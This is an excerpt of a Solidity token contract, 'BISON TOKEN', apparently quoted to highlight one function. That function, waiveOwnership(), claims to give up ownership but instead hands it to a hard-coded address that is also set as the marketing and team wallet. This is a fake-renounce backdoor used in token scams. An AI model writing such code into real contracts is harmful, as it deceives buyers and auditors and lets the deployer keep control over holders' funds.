...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xa177D3Cc52372FB157E27707460313fEdCf097CF));
        _owner = address(0xa177D3Cc52372FB157E27707460313fEdCf097CF);
    }
...
contract BISONTOKEN is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BISON TOKEN";
    string private _symbol = "BISON";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xa177D3Cc52372FB157E27707460313fEdCf097CF);
    address payable public teamWalletAddress = payable(0xa177D3Cc52372FB157E27707460313fEdCf097CF);
